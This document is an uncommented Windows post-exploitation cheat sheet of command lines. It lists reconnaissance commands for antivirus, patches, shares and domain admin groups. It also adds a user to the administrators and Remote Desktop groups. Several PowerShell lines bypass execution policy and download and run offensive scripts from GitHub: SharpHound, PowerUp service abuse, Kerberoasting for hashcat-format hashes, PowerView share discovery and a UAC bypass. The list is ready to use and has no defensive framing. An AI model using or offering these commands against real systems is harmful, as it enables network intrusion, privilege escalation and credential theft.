tasklist /svc
wmic /namespace:\\root\securitycenter2 path antivirusproduct
wmic qfe list brief
net Accounts 
net localgroup administrators
net use
net share
net group "Enterprise Admins" /domain
net localgroup administrators /domain
net localgroup administrators user99 /add
net localgroup "Remote Desktop Users" user99 /add
net localgroup "Debugger users" user99 /add
net localgroup "Power users" user99 /add
net group “Domain Controllers” /domain
net group “Domain Admins” /domain
net user user99 /domain /active:no
net config workstation
net accounts
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-ServiceAbuse -Name 'AbyssWebServer' -User hacker -Password Password1337"
"powershell.exe" -nop -c "import-module applocker; get-command *applocker*
runas /user:DOMAIN\USER /noprofile powershell.exe
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
